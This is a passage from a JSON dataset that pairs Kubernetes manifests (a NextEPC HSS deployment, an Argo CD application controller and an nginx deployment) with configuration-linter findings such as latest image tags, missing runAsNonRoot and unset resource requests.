    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"myapp-container\" is using an invalid container image, \"cewuandy/nextepc-base\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10950",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-network-client\" does not have a read-only root file system"
  },
  {
    "id": "10951",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myapp-container\" does not have a read-only root file system"
  },
  {
    "id": "10952",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-network-client\" is not set to runAsNonRoot"
  },
  {
    "id": "10953",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myapp-container\" is not set to runAsNonRoot"
  },
  {
    "id": "10954",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-network-client\" has cpu request 0"
  },
  {
    "id": "10955",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myapp-container\" has cpu request 0"
  },
  {
    "id": "10956",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-network-client\" has memory limit 0"
  },
  {
    "id": "10957",
    "manifest_path": "data/manifests/the_stack_sample/sample_4203.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-hss-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-hss\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-hss\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-hssd\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.3/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myapp-container\" has memory limit 0"
  },
  {
    "id": "10958",
    "manifest_path": "data/manifests/the_stack_sample/sample_4204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argocd-application-controller\n    app.kubernetes.io/part-of: argocd\n  name: argocd-application-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-application-controller\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: argocd-application-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/part-of: argocd\n              topologyKey: kubernetes.io/hostname\n            weight: 5\n      containers:\n      - command:\n        - argocd-application-controller\n        env:\n        - name: ARGOCD_RECONCILIATION_TIMEOUT\n          valueFrom:\n            configMapKeyRef:\n              key: timeout.reconciliation\n              name: argocd-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER\n          valueFrom:\n            configMapKeyRef:\n              key: repo.server\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_TIMEOUT_SECONDS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.timeout.seconds\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_STATUS_PROCESSORS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.status.processors\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_OPERATION_PROCESSORS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.operation.processors\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_LOGFORMAT\n          valueFrom:\n            configMapKeyRef:\n              key: controller.log.format\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_LOGLEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: controller.log.level\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_METRICS_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.metrics.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_SELF_HEAL_TIMEOUT_SECONDS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.self.heal.timeout.seconds\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_PLAINTEXT\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.plaintext\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_STRICT_TLS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.strict.tls\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APP_STATE_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.app.state.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: REDIS_SERVER\n          valueFrom:\n            configMapKeyRef:\n              key: redis.server\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: REDISDB\n          valueFrom:\n            configMapKeyRef:\n              key: redis.db\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_DEFAULT_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.default.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        image: quay.io/argoproj/argocd:v2.3.2\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8082\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8082\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /app/config/controller/tls\n          name: argocd-repo-server-tls\n        - mountPath: /home/argocd\n          name: argocd-home\n        workingDir: /home/argocd\n      serviceAccountName: argocd-application-controller\n      volumes:\n      - emptyDir: {}\n        name: argocd-home\n      - name: argocd-repo-server-tls\n        secret:\n          items:\n          - key: tls.crt\n            path: tls.crt\n          - key: tls.key\n            path: tls.key\n          - key: ca.crt\n            path: ca.crt\n          optional: true\n          secretName: argocd-repo-server-tls\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"argocd-application-controller\" not found"
  },
  {
    "id": "10959",
    "manifest_path": "data/manifests/the_stack_sample/sample_4204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argocd-application-controller\n    app.kubernetes.io/part-of: argocd\n  name: argocd-application-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-application-controller\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: argocd-application-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/part-of: argocd\n              topologyKey: kubernetes.io/hostname\n            weight: 5\n      containers:\n      - command:\n        - argocd-application-controller\n        env:\n        - name: ARGOCD_RECONCILIATION_TIMEOUT\n          valueFrom:\n            configMapKeyRef:\n              key: timeout.reconciliation\n              name: argocd-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER\n          valueFrom:\n            configMapKeyRef:\n              key: repo.server\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_TIMEOUT_SECONDS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.timeout.seconds\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_STATUS_PROCESSORS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.status.processors\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_OPERATION_PROCESSORS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.operation.processors\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_LOGFORMAT\n          valueFrom:\n            configMapKeyRef:\n              key: controller.log.format\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_LOGLEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: controller.log.level\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_METRICS_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.metrics.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_SELF_HEAL_TIMEOUT_SECONDS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.self.heal.timeout.seconds\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_PLAINTEXT\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.plaintext\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_STRICT_TLS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.strict.tls\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APP_STATE_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.app.state.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: REDIS_SERVER\n          valueFrom:\n            configMapKeyRef:\n              key: redis.server\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: REDISDB\n          valueFrom:\n            configMapKeyRef:\n              key: redis.db\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_DEFAULT_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.default.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        image: quay.io/argoproj/argocd:v2.3.2\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8082\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8082\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /app/config/controller/tls\n          name: argocd-repo-server-tls\n        - mountPath: /home/argocd\n          name: argocd-home\n        workingDir: /home/argocd\n      serviceAccountName: argocd-application-controller\n      volumes:\n      - emptyDir: {}\n        name: argocd-home\n      - name: argocd-repo-server-tls\n        secret:\n          items:\n          - key: tls.crt\n            path: tls.crt\n          - key: tls.key\n            path: tls.key\n          - key: ca.crt\n            path: ca.crt\n          optional: true\n          secretName: argocd-repo-server-tls\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"argocd-application-controller\" has cpu request 0"
  },
  {
    "id": "10960",
    "manifest_path": "data/manifests/the_stack_sample/sample_4204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argocd-application-controller\n    app.kubernetes.io/part-of: argocd\n  name: argocd-application-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: argocd-application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: argocd-application-controller\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: argocd-application-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/part-of: argocd\n              topologyKey: kubernetes.io/hostname\n            weight: 5\n      containers:\n      - command:\n        - argocd-application-controller\n        env:\n        - name: ARGOCD_RECONCILIATION_TIMEOUT\n          valueFrom:\n            configMapKeyRef:\n              key: timeout.reconciliation\n              name: argocd-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER\n          valueFrom:\n            configMapKeyRef:\n              key: repo.server\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_TIMEOUT_SECONDS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.timeout.seconds\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_STATUS_PROCESSORS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.status.processors\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_OPERATION_PROCESSORS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.operation.processors\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_LOGFORMAT\n          valueFrom:\n            configMapKeyRef:\n              key: controller.log.format\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_LOGLEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: controller.log.level\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_METRICS_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.metrics.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_SELF_HEAL_TIMEOUT_SECONDS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.self.heal.timeout.seconds\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_PLAINTEXT\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.plaintext\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APPLICATION_CONTROLLER_REPO_SERVER_STRICT_TLS\n          valueFrom:\n            configMapKeyRef:\n              key: controller.repo.server.strict.tls\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_APP_STATE_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.app.state.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: REDIS_SERVER\n          valueFrom:\n            configMapKeyRef:\n              key: redis.server\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: REDISDB\n          valueFrom:\n            configMapKeyRef:\n              key: redis.db\n              name: argocd-cmd-params-cm\n              optional: true\n        - name: ARGOCD_DEFAULT_CACHE_EXPIRATION\n          valueFrom:\n            configMapKeyRef:\n              key: controller.default.cache.expiration\n              name: argocd-cmd-params-cm\n              optional: true\n        image: quay.io/argoproj/argocd:v2.3.2\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8082\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8082\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        volumeMounts:\n        - mountPath: /app/config/controller/tls\n          name: argocd-repo-server-tls\n        - mountPath: /home/argocd\n          name: argocd-home\n        workingDir: /home/argocd\n      serviceAccountName: argocd-application-controller\n      volumes:\n      - emptyDir: {}\n        name: argocd-home\n      - name: argocd-repo-server-tls\n        secret:\n          items:\n          - key: tls.crt\n            path: tls.crt\n          - key: tls.key\n            path: tls.key\n          - key: ca.crt\n            path: ca.crt\n          optional: true\n          secretName: argocd-repo-server-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"argocd-application-controller\" has memory limit 0"
  },
  {
    "id": "10961",
    "manifest_path": "data/manifests/the_stack_sample/sample_4205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  annotations:\n    cloud-space: any\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10962",
    "manifest_path": "data/manifests/the_stack_sample/sample_4205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  annotations:\n    cloud-space: any\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10963",
    "manifest_path": "data/manifests/the_stack_sample/sample_4205.yaml",
